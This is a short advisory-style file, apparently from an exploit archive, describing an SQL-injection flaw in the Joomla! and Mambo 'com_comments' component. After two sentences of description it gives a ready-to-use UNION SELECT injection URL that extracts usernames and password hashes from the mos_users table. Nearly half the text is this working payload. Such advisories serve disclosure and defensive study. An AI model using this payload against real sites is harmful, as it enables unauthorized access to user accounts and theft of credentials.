@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/27731/info
+
+The Joomla! and Mambo 'com_comments' component is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+http://www.example.com/index.php?option=com_comments&task=view&id=-1+UNION+SELECT+0,999999,concat(username,0x3a,PASSWORD),0,0,0,0,0,0+FROM+mos_users+union+select+*+from+mos_content_comments+where+1=1 
